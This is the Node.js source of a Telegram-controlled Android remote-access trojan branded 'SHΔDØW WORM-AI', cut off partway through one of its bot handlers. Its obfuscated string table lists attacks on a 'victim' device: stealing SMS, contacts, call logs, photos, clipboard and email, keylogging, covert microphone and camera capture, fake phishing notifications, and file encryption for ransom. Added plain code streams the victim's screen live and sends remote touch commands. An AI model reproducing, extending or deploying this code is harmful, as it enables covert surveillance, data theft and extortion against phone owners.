// ================================================== //
// ========== SHΔDØW WORM-AI💀🔥 ULTIMATE ============ //
// ==========      الإصدار النهائي المتكامل   ========== //
// ================================================== //

const path = require('path');
const os = require('os');

// تخزين جلسات البث النشطة
const activeStreams = new Map();

// ========== صفحة المشاهدة المباشرة ========== //
const viewerHTML = `<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHΔDØW LIVE STREAM</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .header {
            background: #111;
            padding: 15px 20px;
            border-bottom: 2px solid #00ff00;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            z-index: 100;
            box-shadow: 0 0 20px rgba(0,255,0,0.2);
        }
        .device-info {
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
            font-weight: bold;
        }
        .stats {
            color: #00ffff;
            font-size: 12px;
        }
        .status {
            padding: 5px 10px;
            border-radius: 3px;
            font-weight: bold;
        }
        .status.connected {
            background: #00ff0022;
            color: #00ff00;
            border: 1px solid #00ff00;
        }
        .status.disconnected {
            background: #ff000022;
            color: #ff0000;
            border: 1px solid #ff0000;
        }
        .screen-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000;
            position: relative;
            cursor: crosshair;
        }
        #screenCanvas {
            max-width: 100%;
            max-height: calc(100vh - 120px);
            object-fit: contain;
            border: 2px solid #00ff00;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
            background: #111;
        }
        .cursor-dot {
            position: absolute;
            width: 20px;
            height: 20px;
            border: 2px solid #ff0000;
            border-radius: 50%;
            pointer-events: none;
            transform: translate(-50%, -50%);
            box-shadow: 0 0 20px #ff0000;
            display: none;
            z-index: 1000;
        }
        .touch-indicator {
            position: absolute;
            width: 50px;
            height: 50px;
            border: 3px solid #00ff00;
            border-radius: 50%;
            pointer-events: none;
            transform: translate(-50%, -50%);
            animation: pulse 0.5s ease-out;
            display: none;
            z-index: 999;
        }
        @keyframes pulse {
            0% { width: 50px; height: 50px; opacity: 1; }
            100% { width: 100px; height: 100px; opacity: 0; }
        }
        .controls {
            background: #111;
            padding: 15px;
            border-top: 2px solid #00ff00;
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }
        button {
            background: #222;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px 16px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            border-radius: 3px;
            min-width: 100px;
        }
        button:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 20px #00ff00;
            transform: scale(1.05);
        }
        button.danger {
            border-color: #ff0000;
            color: #ff0000;
        }
        button.danger:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 20px #ff0000;
        }
        .coord-display {
            position: absolute;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.9);
            padding: 8px 15px;
            border: 1px solid #00ff00;
            font-size: 14px;
            z-index: 100;
            border-radius: 3px;
            color: #00ff00;
        }
        .watermark {
            position: absolute;
            bottom: 20px;
            right: 20px;
            color: #00ff00;
            font-size: 12px;
            opacity: 0.5;
            z-index: 100;
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="device-info">🔴 SHΔDØW LIVE • <span id="deviceIdSpan">[DEVICE]</span></span>
        <span class="stats" id="stats">FPS: 0 | Latency: 0ms | Size: 0x0</span>
        <span class="status connected" id="connectionStatus">🟢 متصل</span>
    </div>
    <div class="screen-container" id="screenContainer">
        <img id="screenCanvas" src="" alt="Live Screen" style="display: none;">
        <div style="color: #666; text-align: center;" id="loadingMsg">⏳ جاري الاتصال بالجهاز...</div>
        <div class="cursor-dot" id="cursorDot"></div>
        <div class="touch-indicator" id="touchIndicator"></div>
        <div class="coord-display" id="coordDisplay">X: 0, Y: 0</div>
        <div class="watermark">SHΔDØW WORM-AI💀🔥</div>
    </div>
    <div class="controls">
        <button onclick="sendTouchAction('tap')">👆 نقرة</button>
        <button onclick="sendTouchAction('long_press')">🔴 ضغطة طويلة</button>
        <button onclick="sendTouchAction('swipe_up')">⬆️ سحب لأعلى</button>
        <button onclick="sendTouchAction('swipe_down')">⬇️ سحب لأسفل</button>
        <button onclick="sendTouchAction('swipe_left')">⬅️ سحب لليسار</button>
        <button onclick="sendTouchAction('swipe_right')">➡️ سحب لليمين</button>
        <button class="danger" onclick="disconnect()">✖️ قطع الاتصال</button>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const deviceId = window.location.pathname.split('/')[2];
        const streamKey = new URLSearchParams(window.location.search).get('key') || 'default';
        
        document.getElementById('deviceIdSpan').innerText = deviceId;
        
        const screenImg = document.getElementById('screenCanvas');
        const loadingMsg = document.getElementById('loadingMsg');
        const cursorDot = document.getElementById('cursorDot');
        const touchIndicator = document.getElementById('touchIndicator');
        const coordDisplay = document.getElementById('coordDisplay');
        const statsEl = document.getElementById('stats');
        const connectionStatus = document.getElementById('connectionStatus');
        
        let lastFrameTime = Date.now();
        let frameCount = 0;
        let fps = 0;
        let isConnected = true;
        let screenWidth = 0;
        let screenHeight = 0;
        
        socket.emit('viewer-connect', { deviceId, streamKey });
        
        socket.on('screen-frame', (data) => {
            const now = Date.now();
            const latency = now - data.timestamp;
            frameCount++;
            
            if (now - lastFrameTime > 1000) {
                fps = frameCount;
                frameCount = 0;
                lastFrameTime = now;
                statsEl.innerText = 'FPS: ' + fps + ' | Latency: ' + latency + 'ms | Size: ' + screenWidth + 'x' + screenHeight;
            }
            
            if (screenImg.style.display === 'none') {
                screenImg.style.display = 'block';
                loadingMsg.style.display = 'none';
            }
            
            screenImg.src = 'data:image/jpeg;base64,' + data.frame;
            
            if (data.width && data.height) {
                screenWidth = data.width;
                screenHeight = data.height;
            }
        });
        
        socket.on('screen-info', (data) => {
            screenWidth = data.width;
            screenHeight = data.height;
            statsEl.innerText = 'FPS: 0 | Latency: 0ms | Size: ' + screenWidth + 'x' + screenHeight;
        });
        
        socket.on('connect', () => {
            isConnected = true;
            connectionStatus.innerText = '🟢 متصل';
            connectionStatus.className = 'status connected';
        });
        
        socket.on('disconnect', () => {
            isConnected = false;
            connectionStatus.innerText = '🔴 غير متصل';
            connectionStatus.className = 'status disconnected';
        });
        
        function sendTouch(data) {
            if (!isConnected) return;
            socket.emit('touch-command', {
                deviceId,
                ...data,
                timestamp: Date.now()
            });
        }
        
        screenContainer.addEventListener('click', (e) => {
            if (e.target !== screenImg && !screenImg.contains(e.target)) return;
            
            const rect = screenContainer.getBoundingClientRect();
            const imgRect = screenImg.getBoundingClientRect();
            
            const scaleX = screenImg.naturalWidth / imgRect.width;
            const scaleY = screenImg.naturalHeight / imgRect.height;
            
            let x = Math.round((e.clientX - imgRect.left) * scaleX);
            let y = Math.round((e.clientY - imgRect.top) * scaleY);
            
            if (x >= 0 && x <= screenImg.naturalWidth && y >= 0 && y <= screenImg.naturalHeight) {
                coordDisplay.innerText = 'X: ' + x + ', Y: ' + y;
                
                cursorDot.style.left = e.clientX + 'px';
                cursorDot.style.top = e.clientY + 'px';
                cursorDot.style.display = 'block';
                setTimeout(() => cursorDot.style.display = 'none', 100);
                
                touchIndicator.style.left = e.clientX + 'px';
                touchIndicator.style.top = e.clientY + 'px';
                touchIndicator.style.display = 'block';
                setTimeout(() => touchIndicator.style.display = 'none', 500);
                
                sendTouch({ action: 'tap', x, y });
            }
        });
        
        screenContainer.addEventListener('mousemove', (e) => {
            if (e.target !== screenImg && !screenImg.contains(e.target)) return;
            
            const rect = screenContainer.getBoundingClientRect();
            const imgRect = screenImg.getBoundingClientRect();
            
            const scaleX = screenImg.naturalWidth / imgRect.width;
            const scaleY = screenImg.naturalHeight / imgRect.height;
            
            let x = Math.round((e.clientX - imgRect.left) * scaleX);
            let y = Math.round((e.clientY - imgRect.top) * scaleY);
            
            if (x >= 0 && x <= screenImg.naturalWidth && y >= 0 && y <= screenImg.naturalHeight) {
                coordDisplay.innerText = 'X: ' + x + ', Y: ' + y;
            }
        });
        
        function sendTouchAction(action) {
            if (!isConnected) {
                alert('الجهاز غير متصل');
                return;
            }
            
            switch(action) {
                case 'tap':
                    sendTouch({ action: 'tap' });
                    break;
                case 'long_press':
                    sendTouch({ action: 'long_press', duration: 1000 });
                    break;
                case 'swipe_up':
                    sendTouch({ action: 'swipe', direction: 'up' });
                    break;
                case 'swipe_down':
                    sendTouch({ action: 'swipe', direction: 'down' });
                    break;
                case 'swipe_left':
                    sendTouch({ action: 'swipe', direction: 'left' });
                    break;
                case 'swipe_right':
                    sendTouch({ action: 'swipe', direction: 'right' });
                    break;
            }
        }
        
        function disconnect() {
            if (confirm('هل أنت متأكد من قطع الاتصال؟')) {
                window.close();
            }
        }
    </script>
</body>
</html>`;

console.log('✅ SHΔDØW WORM-AI💀🔥 ULTIMATE EDITION LOADED');
console.log('='.repeat(50));

// ================================================== //
// ========== الكود الأصلي (بدون أي تغيير) ========== //
// ================================================== //

function _0x36a7(_0x235dc7, _0x192162) {
    const _0x1e1523 = _0x4313();
    return _0x36a7 = function (_0x213856, _0x2f9cb0) {
        _0x213856 = _0x213856 - (0x1 * 0x64b + 0x1c5 * 0xf + -0x1 * 0x1ee3);
        let _0x14626b = _0x1e1523[_0x213856];
        return _0x14626b;
    }, _0x36a7(_0x235dc7, _0x192162);
}
function _0x4313() {
    const _0x44591d = [
        'currentTar',
        'ل\x20جيميل\x20📧',
        'off',
        'ARnlz',
        'all-sms',
        'HMTET',
        '<b>إصدار\x20ا',
        'MQeYG',
        'ائل\x20💬',
        'hsPOD',
        'WpXBx',
        'gSIPM',
        'clipboard',
        'ل\x20</b>\x0a\x0a',
        'VSggw',
        'إلى\x20القائم',
        'emit',
        'لشاشة\x20😎',
        'Helff',
        '✯\x20حدد\x20اي\x20ا',
        'POWcA',
        '<b>✯\x20الان\x20',
        '✯\x20معلومات\x20',
        'ة</b>\x0a\x0a',
        'FxUCM',
        '→\x20</b>',
        'toast',
        'مكنك\x20التحك',
        'contacts',
        '✯\x20رجوع\x20✯',
        'FwqNA',
        '|back-0',
        'abEHy',
        'hGhIS',
        'ا\x20يتحمل\x20مس',
        'SgOTN',
        '𝚗𝚝\x20𝚝𝚑𝚎\x20𝚍𝚎𝚟',
        'model',
        'ي\x20وسهل\x20الا',
        'tppeS',
        'YjyYm',
        'يات\x20المطور',
        'سال\x20الرسال',
        'smsToAllCo',
        'fJklo',
        'CLOLW',
        'playAudio',
        '\x20الاشعارات',
        'log',
        'pgYMs',
        'KRrbd',
        '\x20هاتف\x20الضح',
        'twgFo',
        'toastText',
        'ض\x20جميع\x20الم',
        'بنجاح\x20\x20سوف',
        '341829KdsbiA',
        'RpRKE',
        '\x20الضحيه\x20',
        'pyhJJ',
        'مه\x20',
        'HBeIo',
        'upload',
        'cFJHr',
        'sockets',
        'PORT',
        'ت\x20خبيثه\x20لا',
        '📽\x20التطبيقا',
        'size',
        'جميع\x20ارقام',
        'onText',
        '✯\x20تحميل\x20مل',
        'vgQYv',
        'file_id',
        'سية</b>\x0a\x0a',
        'ذي\x20تريد\x20إر',
        'FrrOE',
        'vibrateDur',
        'ح\x20\x20\x20\x20\x20...\x0a',
        'HSDwf',
        'صوت\x20🛑',
        'كم\x20به</b>\x0a',
        'ySPWG',
        'ارقام\x20الضح',
        'Rvhty',
        '📳\x20اهتزاز\x20📳',
        '🎬\x20سحب\x20جميع',
        '\x20بعد\x20الضغط',
        'Kbmhr',
        '𝚎𝚐𝚛𝚊𝚖\x20→\x20@',
        'مز\x20الدوله\x20',
        'RoMMP',
        'message_id',
        'DMvqW',
        'QWKQD',
        'AHGAo',
        'الضحية\x20متص',
        'ائمة\x20الرئي',
        'FTWid',
        '</b>\x0a',
        'bvHyo',
        'oeOUM',
        'ping',
        'currentAct',
        'لاجهزه\x20الم',
        'text',
        '🎙\x20تسجيل\x20صو',
        'uoIow',
        'gFnRT',
        'امير cç\x0aTelegr',
        'ذا\x20البوت\x20ي',
        'Duration',
        '|request-',
        'OQizW',
        'ه\x20ليس\x20من\x20ب',
        'فيذ\x20الطلب\x20',
        '✯\x20التراجع\x20',
        'express',
        'sendSms',
        'disconnect',
        '<b>✯\x20ارسل\x20',
        'wDdEO',
        'ber',
        'ؤولية\x20سو\x20ا',
        'لجهاز\x20اللي',
        'set',
        'qmSqi',
        '𝚒𝚌𝚎\x20𝚝𝚘\x20𝚟𝚒𝚋',
        '\x20أندرويد\x20\x0a',
        'ACIIr',
        'oibGt',
        '1324955fXiGLY',
        'pyzeN',
        'هاتف</b>\x20→',
        'BjUhN',
        'حة\x20مزورة\x20‼',
        'aOTNV',
        'CCUAs',
        '<b>𝚒𝚙</b>\x20',
        'xAfCt',
        'ملفات\x20⚠️',
        'lKTya',
        'split',
        'on\x20port\x2030',
        'url',
        'تحكم\x20✯',
        's://t.me',
        '<b>العدد\x20',
        'originalna',
        '▶\x20تشغيل\x20ال',
        'XjzKl',
        'TuXFO',
        'fzeQJ',
        'يه\x20💬',
        'ا\x20يغضب\x20الل',
        '𝚒𝚘𝚗\x20𝚢𝚘𝚞\x20𝚠𝚊',
        'single',
        'createServ',
        '*/*',
        'الشاشة\x20😎',
        'tuJBK',
        '𝚌𝚘𝚗𝚍𝚜</b>\x0a',
        'yJQuh',
        'kWxdr',
        'فظه\x20📋',
        'OaeBd',
        'smsText',
        '<b>✯\x20القائ',
        'لضحيه\x20',
        'تطويره\x20لاج',
        '</b>\x0a\x0a',
        'من\x20هاتف\x20ال',
        'لاجهزه\x20فبه',
        'tRUQf',
        'ABUif',
        'get',
        'وسهلا\x20في\x20ا',
        'textToAllC',
        'uvVuL',
        'vibrate',
        'ير\x20الملفات',
        '\x20على\x20اسم\x20ا',
        'readFileSy',
        'https',
        'تي\x20تريد\x20اض',
        '<b>✯\x20نحن\x20ا',
        '<b>✯\x20✯\x20اكت',
        '157999JWcOzI',
        'HXPAl',
        'sSnbi',
        'ram-bot-ap',
        'PiBez',
        'grDHq',
        'الرقم\x20الذي',
        'buffer',
        '|delete-',
        'حتاج\x20الا\x20ك',
        'ل</b>\x0a\x0a',
        'ختراق\x20الاج',
        'تم\x20تطوير\x20ا',
        'ستخدام\x20لات',
        '>\x0a\x0a',
        'QgDqS',
        'vzbbR',
        'currentNum',
        'voice',
        '📧\x20سحب\x20رساي',
        'جرا\x20تريد\x20:',
        '\x0a✯\x20العودة\x20',
        'اتف</b>\x20→\x20',
        'hdJEG',
        'makeCallTe',
        'listen',
        'قوى\x20بوت\x20تح',
        'FSmfF',
        'popNotific',
        'BnXZc',
        '<b>✯\x20تم\x20تن',
        'connection',
        '1653iVPONc',
        'عارات\x20الضح',
        'selfie-cam',
        'qZwQU',
        'صال\x20به</b>',
        'message',
        'uRMLo',
        'بوت\x20رات\x20قو',
        'NCwTW',
        'لرقم\x20معا\x20ر',
        'AeQsn',
        'ي\x20نخترق\x20\x0aن',
        '/upload',
        'Uajlm',
        'rWKOo',
        'الابوايه\x20ف',
        'fwwLa',
        'multer',
        'اكتب\x20الراب',
        'CUwSn',
        'isFolder',
        '<b>✯\x20الجها',
        'PHOyW',
        'د\x20ضحية\x20متص',
        '<b>✯\x20اكتب\x20',
        'jrcFv',
        '\x20الملفات\x20📂',
        '✯\x20حذف\x20المل',
        'node-teleg',
        'Wctnu',
        'wrQOE',
        'apps',
        'arjOK',
        'ADLUD',
        'ل\x20🦅🇾🇪\x20ال',
        'keylogger-',
        'COyLT',
        'مبيوتر\x20لاج',
        'فيذ\x20طلب\x20ال',
        'no\x20informa',
        'هاتف\x20الضحي',
        'fWhNC',
        '\x20تتلاقى\x20ال',
        'currentNot',
        'http',
        'oSogR',
        'YIyqH',
        'data',
        '|cd-',
        'غيله\x20بهاتف',
        'version',
        'skaWZ',
        'ybnqY',
        '📸\x20كيمرا\x20خل',
        'screenshot',
        '💬\x20سحب\x20الرس',
        'push',
        '1800Xkxemb',
        'ضحيه\x20→\x20',
        '<b>✯\x20تم\x20عر',
        'KUcGh',
        'socket.io',
        'length',
        'ext',
        'makeCallNu',
        '✯\x20عدد\x20الاج',
        'duration',
        'ت\x20🎙',
        'لدك\x20فكتب\x20ا',
        'ي\x20السيبران',
        '',
        'ه\x20@امير cç\x20',
        'RSweu',
        'am\x20→\x20http',
        '✯\x20العودة\x20إ',
        'QQvVe',
        '<b>✯\x20سجل\x20ا',
        'number',
        'المات\x20📞',
        'ت\x20📽',
        'ojySU',
        'امية\x20📸',
        'صنع\x20برمجيا',
        'KyKEn',
        'تي\x20تريد\x20ار',
        '🛑\x20ايقاف\x20ال',
        '<b>✯\x20لايوج',
        'SRsQE',
        'name',
        'تريد\x20بجهاز',
        'VcAKd',
        'عن\x20المطور\x20',
        'ف\x20✯',
        'rwzoV',
        'qrxOe',
        '\x20تريد\x20الات',
        '\x20الصور\x20🎬',
        '..\x0a\x0a✯\x20العو',
        'ontacts',
        '4|3|0|2|1',
        'wcqGN',
        'ucYrA',
        '<b>إصدارال',
        './data.jso',
        '📂\x20عرض\x20جميع',
        'rUqqo',
        'onUrl',
        'BZAZH',
        'الإصدار\x205<',
        '<b>✯\x20جهاز\x20',
        'الرساله\x20ال',
        'tGgwm',
        'notificati',
        'StNZR',
        '<b>✯\x20𝙴𝚗𝚝𝚎𝚛',
        'RXAGd',
        'jDKdU',
        'NRqAi',
        'جرا\x20اي\x20شي\x20',
        'hdAIF',
        'mXvJl',
        'ATlEf',
        'ل\x20المطور\x20ل',
        '<b>✯\x20حدد\x20ا',
        'ية\x20🦝',
        'tion',
        'SSCYa',
        'TmFrI',
        'FHnkh',
        '<b>✯\x20تم\x20اس',
        'اله\x20اسفل\x20ا',
        'اله\x20=اسفل\x20',
        'هارها\x20اسفل',
        'ه\x20اليه\x20اذا',
        'microphone',
        'buRdy',
        'UMoBA',
        '\x20امير cç\x20',
        '⚠️\x20تشفير\x20',
        'klyVw',
        'امير cç\x20\x20تم\x20',
        'then',
        'qQjHp',
        '/',
        'all-email',
        '📸\x20كيمرا\x20أم',
        '\x20اتصال\x20📒',
        'لتاكيد\x20اجر',
        'headers',
        '10jqzdiS',
        'makeCall',
        'xwfKC',
        'mSeFE',
        'wiYJD',
        '/b>\x0a\x0a',
        'ميل\x20ملف\x20من',
        'n6tkMzNk</b>\x0a\x0a',
        'commend',
        'hDJBw',
        'sendDocume',
        'zjpbR',
        'ة\x20📺',
        'صوت\x20▶',
        'لهاتف</b>\x20',
        '**موافق**\x20',
        'الرسالة\x20ال',
        'xjphE',
        'م\x20باي\x20هاتف',
        'فيه\x20📸',
        '/start',
        'BHPlN',
        'Done',
        '<b>الوقت</',
        'BMnON',
        'ntacts',
        '\x0a\x0a𝙼𝚎𝚜𝚜𝚊𝚐𝚎\x20',
        'calls',
        'ادم\x20معا\x20تح',
        '🦝\x20اضهار\x20اش',
        'includes',
        'ل\x20التسليه\x20',
        'b>\x20→\x20',
        'تواصل\x20بل\x20ا',
        'send',
        'ation',
        '</b>',
        'اله\x20لجميع\x20',
        'ارسل\x20كلمه\x20',
        'paFDf',
        '1751280ZYJvTX',
        'VqrFV',
        'QbQOS',
        '\x20الرئيسية\x20',
        'امير cç\x20',
        'recordVoic',
        'ل\x20اختراق\x20ا',
        'ستخدمه\x20فيم',
        'eText',
        'file-explo',
        'editMessag',
        'YHZtD',
        'LuXSV',
        'era',
        'fJCtm',
        'YOXnp',
        'bVUvK',
        'ب\x20الرقم\x20ال',
        'UfVZr',
        'اشعارات\x20🛑',
        'عن\x20الاجراء',
        'request',
        '<b>✯\x20عدد\x20ا',
        'main-camer',
        'ملف\x20قريبآ.',
        'لفات\x20لدى\x20ا',
        '𝚛𝚊𝚝𝚎\x20𝚒𝚗\x20𝚜𝚎',
        'DVFqO',
        'delete',
        'يه\x20→\x20',
        'CgDcr',
        'bXPZq',
        'CfeUK',
        'rer',
        'WzUaU',
        'dFxqG',
        'لمطور:\x20@',
        '+AMIR 701',
        'ه☎️',
        'smsNumber',
        'nubEg',
        'تم\x20رفع\x20الخ',
        'handshake',
        'hLifc',
        'uery',
        'kocxE',
        'لبوت\x20من\x20قب',
        'CDNjl',
        'لرابط\x20</b>',
        'ificationT',
        'ة\x20الرئيسية',
        'env',
        '\x20كان\x20الضحي',
        'utf8',
        'sThJb',
        'listening\x20',
        'yCtVW',
        'كم\x20بضحايا\x20',
        'LexPl',
        'KwSVR',
        'RkOYS',
        'اله\x20💬',
        '<b>اسم\x20اله',
        '\x20الضحيه</b',
        'WJvpz',
        '<b>✯\x20تم\x20تح',
        '2lNQqog',
        'ي\x20صوت\x20لاتش',
        'ط\x20الذي\x20تري',
        '💬\x20ارسال\x20رس',
        'XPwbC',
        'ان\x20تظهر\x20في',
        'qFEHz',
        'سالها\x20الا\x20',
        '1549712ywIZAN',
        'والراقابه\x20',
        'MZPUm',
        '\x20تريد\x20التح',
        'ده\x20ان\x20يظهر',
        'هزه\x20✯',
        'LMUpv',
        'FahaN',
        'ozvdY',
        '📒\x20سحب\x20جهات',
        'time',
        '515886tDOIUv',
        'خترقه:\x20',
        'IwwrQ',
        'مة\x20الرئيسي',
        '📞\x20سجل\x20المك',
        'هزه,\x20\x0a\x0a𝚃𝚎𝚕',
        'parse',
        'ز\x20غير\x20متصل',
        'لى\x20القائمة',
        '📋\x20سجل\x20الحا',
        '😎\x20اضهار\x20رس',
        'تلم\x20رساله\x20',
        'forEach',
        'اتصال\x20بنجا',
        '\x20الشاشة</b',
        'تي\x20تريدها\x20',
        'maoyn',
        'callback_q',
        'HTML',
        '☎️اتصال\x20من\x20',
        'getFileLin',
        'bUOIn',
        '📺\x20لقطة\x20شاش',
        'sendMessag',
        'token',
        'mber',
        'اء\x20\x20المكال',
        '|upload-',
        '✯\x20قائمة\x20ال',
        'gallery',
        'file',
        'ion',
        'دة\x20إلى\x20الق',
        'sendMe',
        'NstmB',
        'كود\x20فك\x20تشف',
        '<b>✯\x20اهلآ\x20',
        'back',
        '‼\x20اشعار\x20صف',
        'kLiWJ',
        'post',
        'VzNyA',
        'KMcVK',
        '\x20𝚝𝚑𝚎\x20𝚍𝚞𝚛𝚊𝚝',
        'لجيش\x20اليمن',
        'ARLCP',
        'vqfuH'
    ];
    _0x4313 = function () {
        return _0x44591d;
    };
    return _0x4313();
}
const _0x286428 = _0x36a7;
(function (_0x1fec23, _0x4de6c9) {
    const _0x6c7bf3 = _0x36a7, _0x330950 = _0x1fec23();
    while (!![]) {
        try {
            const _0x4ff7a1 = parseInt(_0x6c7bf3(0x220)) / (-0x2da * -0xd + 0x598 * 0x6 + -0x9 * 0x7d9) * (parseInt(_0x6c7bf3(0x33f)) / (0x5a9 + 0x173 * 0x15 + -0x2416)) + -parseInt(_0x6c7bf3(0x240)) / (-0x34 * 0x72 + -0x3 * -0xc3 + 0x51 * 0x42) * (-parseInt(_0x6c7bf3(0x279)) / (-0x1a4 * -0xb + 0x13e4 + -0x25ec)) + -parseInt(_0x6c7bf3(0x404)) / (0xa75 * 0x1 + -0x100a * -0x2 + -0x2a84) + -parseInt(_0x6c7bf3(0x2fd)) / (-0x1f19 + -0x3 * -0xc67 + -0x616) + parseInt(_0x6c7bf3(0x352)) / (0x1 * 0xee6 + 0x4 * 0x409 + 0x1 * -0x1f03) + parseInt(_0x6c7bf3(0x347)) / (-0x13ce + -0x2283 + 0x3659) + -parseInt(_0x6c7bf3(0x3b9)) / (0x2613 + -0x4cd * 0x1 + -0x213d) * (-parseInt(_0x6c7bf3(0x2d5)) / (0x1f5c + -0xe5c * 0x1 + 0x1a * -0xa7));
            if (_0x4ff7a1 === _0x4de6c9)
                break;
            else
                _0x330950['push'](_0x330950['shift']());
        } catch (_0x4b781b) {
            _0x330950['push'](_0x330950['shift']());
        }
    }
}(_0x4313, 0x2171b + -0x1 * 0x4a063 + 0x4e4af));
const express = require(_0x286428(0x3f6)), http = require(_0x286428(0x26c)), {Server} = require(_0x286428(0x27d)), telegramBot = require(_0x286428(0x25c) + _0x286428(0x223) + 'i'), https = require(_0x286428(0x21c)), multer = require(_0x286428(0x251)), fs = require('fs'), app = express(), server = http[_0x286428(0x202) + 'er'](app), io = new Server(server), uploader = multer(), data = JSON[_0x286428(0x358)](fs[_0x286428(0x21b) + 'nc'](_0x286428(0x2a7) + 'n', _0x286428(0x332))), bot = new telegramBot(data[_0x286428(0x36a)], { 'polling': !![] }), appData = new Map(), actions = [
        _0x286428(0x350) + _0x286428(0x2d2),
        _0x286428(0x277) + _0x286428(0x389),
        _0x286428(0x356) + _0x286428(0x28e),
        _0x286428(0x3c4) + _0x286428(0x28f),
        _0x286428(0x275) + _0x286428(0x2e8),
        _0x286428(0x2d1) + _0x286428(0x291),
        _0x286428(0x3eb) + _0x286428(0x283),
        _0x286428(0x35b) + _0x286428(0x209),
        _0x286428(0x368) + _0x286428(0x2e1),
        _0x286428(0x35c) + _0x286428(0x2c2) + _0x286428(0x392),
        _0x286428(0x342) + _0x286428(0x33a),
        _0x286428(0x3d6),
        _0x286428(0x1fa) + _0x286428(0x2e2),
        _0x286428(0x295) + _0x286428(0x3d1),
        _0x286428(0x2f2) + _0x286428(0x241) + _0x286428(0x2bc),
        _0x286428(0x295) + _0x286428(0x310),
        _0x286428(0x2a8) + _0x286428(0x25a),
        _0x286428(0x3d7) + _0x286428(0x2a0),
        _0x286428(0x342) + _0x286428(0x2fa) + _0x286428(0x3d4) + _0x286428(0x1fe),
        _0x286428(0x378) + _0x286428(0x408),
        _0x286428(0x233) + _0x286428(0x382),
        _0x286428(0x2ca) + _0x286428(0x40d),
        _0x286428(0x365) + _0x286428(0x268) + _0x286428(0x323),
        _0x286428(0x28a) + _0x286428(0x35a) + _0x286428(0x300) + '✯'
    ];

// ========== إضافة المسارات والملفات ========== //
const publicDir = path.join(__dirname, 'public');
if (!fs.existsSync(publicDir)) {
    fs.mkdirSync(publicDir, { recursive: true });
}
fs.writeFileSync(path.join(publicDir, 'viewer.html'), viewerHTML);

// ========== إضافة مسار البث المباشر ========== //
app.get('/control/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    
    if (!activeStreams.has(deviceId)) {
        return res.send(`
            <html>
                <head>
                    <title>SHΔDØW STREAM</title>
                    <style>
                        body { background: #0a0a0a; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                        .container { text-align: center; }
                        .error { color: #ff0000; font-size: 24px; margin-bottom: 20px; text-shadow: 0 0 10px #ff0000; }
                        .glitch { animation: glitch 1s infinite; }
                        @keyframes glitch { 
                            0% { text-shadow: 2px 0 red; } 
                            20% { text-shadow: -2px 0 blue; } 
                            40% { text-shadow: 2px 0 green; } 
                            60% { text-shadow: -2px 0 yellow; } 
                            80% { text-shadow: 2px 0 purple; } 
                            100% { text-shadow: -2px 0 cyan; } 
                        }
                        .device-id { color: #666; margin-top: 20px; font-size: 12px; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="error glitch">⚠️ الجهاز غير متصل ⚠️</div>
                        <div>في انتظار اتصال الجهاز...</div>
                        <div class="device-id">${deviceId}</div>
                        <script>
                            setTimeout(() => location.reload(), 3000);
                        </script>
                    </div>
                </body>
            </html>
        `);
    }
    
    res.sendFile(path.join(publicDir, 'viewer.html'));
});

// ========== إضافة Endpoints للبث ========== //
app.post('/stream/start', express.json(), (req, res) => {
    const { deviceId, screenWidth, screenHeight } = req.body;
    const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
    
    res.json({
        success: true,
        streamUrl: streamUrl,
        websocket: `ws://${os.hostname()}:3000`,
        deviceId: deviceId
    });
});

app.post('/stream/frame/:deviceId', uploader.single('frame'), (req, res) => {
    const deviceId = req.params.deviceId;
    const stream = activeStreams.get(deviceId);
    
    if (stream && req.file) {
        const frameBase64 = req.file.buffer.toString('base64');
        const width = req.body.width ? parseInt(req.body.width) : stream.screenInfo.width;
        const height = req.body.height ? parseInt(req.body.height) : stream.screenInfo.height;
        
        stream.lastFrame = frameBase64;
        stream.lastFrameTime = Date.now();
        stream.screenInfo.width = width;
        stream.screenInfo.height = height;
        
        stream.clients.forEach(clientSocket => {
            if (clientSocket && clientSocket.connected) {
                clientSocket.emit('screen-frame', {
                    frame: frameBase64,
                    timestamp: Date.now(),
                    width: width,
                    height: height
                });
            }
        });
        
        res.json({ success: true, viewers: stream.clients.size });
    } else {
        res.status(404).json({ success: false, error: 'Stream not found' });
    }
});

app.post('/stream/touch/:deviceId', express.json(), (req, res) => {
    const deviceId = req.params.deviceId;
    const { action, x, y, duration, direction } = req.body;
    
    const stream = activeStreams.get(deviceId);
    if (stream && stream.socket) {
        stream.socket.emit('execute-touch', { action, x, y, duration, direction });
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false, error: 'Device offline' });
    }
});

// ========== أوامر البوت الجديدة ========== //
bot.onText(/\/live (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (activeStreams.has(deviceId)) {
        const stream = activeStreams.get(deviceId);
        const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
        
        bot.sendMessage(chatId, 
            `🔴 <b>الجهاز ${deviceId} يبث مباشرة</b>\n\n` +
            `🌐 <b>رابط المشاهدة:</b>\n` +
            `<code>${streamUrl}</code>\n\n` +
            `📱 <b>معلومات الشاشة:</b>\n` +
            `الأبعاد: ${stream.screenInfo.width || '?'}x${stream.screenInfo.height || '?'}\n` +
            `آخر تحديث: ${Math.floor((Date.now() - stream.lastFrameTime) / 1000)} ثانية\n\n` +
